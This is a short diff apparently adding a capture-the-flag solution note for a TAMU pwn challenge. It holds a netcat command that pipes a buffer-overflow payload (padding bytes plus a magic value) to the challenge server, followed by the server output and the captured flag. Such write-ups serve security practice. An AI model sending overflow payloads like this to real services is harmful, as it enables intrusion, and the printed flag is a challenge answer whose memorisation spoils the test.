@@ -1,0 +1,10 @@
+
+nc pwn.ctf.tamu.edu 4321
+
+➜  ~ echo -e '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x11\xba\x07\xf0'|nc pwn.ctf.tamu.edu 4321
+This is a super secret program
+Noone is allowed through except for those who know the secret!
+What is my secret?
+How did you figure out my secret?!
+gigem{H0W_H4RD_1S_TH4T?}
+
